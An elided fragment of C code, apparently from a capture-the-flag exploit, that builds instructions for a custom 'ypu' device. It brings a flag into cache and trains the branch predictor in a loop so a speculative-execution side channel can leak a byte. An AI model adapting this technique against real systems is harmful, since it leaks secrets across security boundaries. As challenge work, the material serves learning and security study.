...
void leak_byte(struct instruction_t *code, int ypu_fd, char* leaked, int bidx) {
    ...
    // access mem[ds:0][addr:128] to bring the flag in to cache every run
    code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = 128 };
    code[ip++] = (struct instruction_t){ .op = INST_STM, .arg1 = SPEC_REG_A, .arg2 = SPEC_REG_A };
    ...
    for (int i = 0; i < 80; i++) {
        ip = sched_ip;
        // use in-bounds sched for training
        sys_exec(code, &ip, 1, SPEC_REG_D);
